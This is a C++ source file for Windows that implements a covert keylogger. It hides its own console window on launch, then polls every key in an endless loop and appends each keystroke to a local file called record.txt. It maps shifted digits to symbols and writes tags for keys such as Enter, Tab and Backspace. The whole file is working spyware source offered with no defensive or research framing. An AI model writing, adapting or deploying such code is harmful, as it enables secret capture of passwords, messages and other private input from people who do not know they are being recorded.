#include <iostream>
#include <windows.h> 
#include <Winuser.h> 
#include <fstream>    

using namespace std;

// Hide executable cmd window automatically
void hide(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}

// This function track all the keyboard key press
void keylog(){
	char key;
	while(true){
		for(key=0 ;key<=255; key++){
			if (GetAsyncKeyState(key) == -32767){
				ofstream write ("record.txt", ios::app);
				// Upper case key A - Z
				//shift(0x10), cap lock(0x14)
				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
					write << key;
					write.close();
					break;
				}
				// Lower Case key a - z
				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
					key +=32;
					write << key;           
					write.close();
					break;
				}
				// Special Symbols key
				else{
					switch (key){
						case 48:
							(GetAsyncKeyState(0x10)?write << ")":write << key);
							break;
						case 49:
							(GetAsyncKeyState(0x10)?write << "!":write << key);
							break;
						case 50:
							(GetAsyncKeyState(0x10)?write << "@":write << key);
							break;
						case 51:
							(GetAsyncKeyState(0x10)?write << "#":write << key);
							break;
						case 52:
							(GetAsyncKeyState(0x10)?write << "$":write << key);
							break;
						case 53:
							(GetAsyncKeyState(0x10)?write << "%":write << key);
							break;
						case 54:
							(GetAsyncKeyState(0x10)?write << "^":write << key);
							break;
						case 55:
							(GetAsyncKeyState(0x10)?write << "&":write << key);
							break;
						case 56:
							(GetAsyncKeyState(0x10)?write << "*":write << key);
							break;
						case 57:
							(GetAsyncKeyState(0x10)?write << "(":write << key);
							break;	
						// Special Symbols Virtual Key 
						case VK_ESCAPE:
							write << "<Esc>"; //Esc (0x1B) 
							break;
						case VK_TAB:
							write << "<Tab>"; //Tab (0x09)
							break;
						case VK_CAPITAL:
							write << "<CapsLock>"; //Caps Lock (0x14) 
							break;
						// case VK_SHIFT:
						// 	write << "<Shift>"; //Shift (0x10) 
						// 	break;
						case VK_CONTROL:
							write << "<Ctrl>"; //Ctrl (0x11) 
							break;
						case VK_MENU:
							write << "<Alt>"; //Alt (0x12) 
							break;	
						case VK_SPACE:
							write << "<Space>"; //Space (0x20)
							break;	
						case VK_BACK:
							write << "<BackSpace>"; //Back Space (0x08)
							break;
						case VK_RETURN: 
							write << "<Enter>\n"; //Enter (0x0D)
							break;
					}
				}					
			}
		}
	}
}

int main(){
	hide();
	keylog();
	return 0;
}
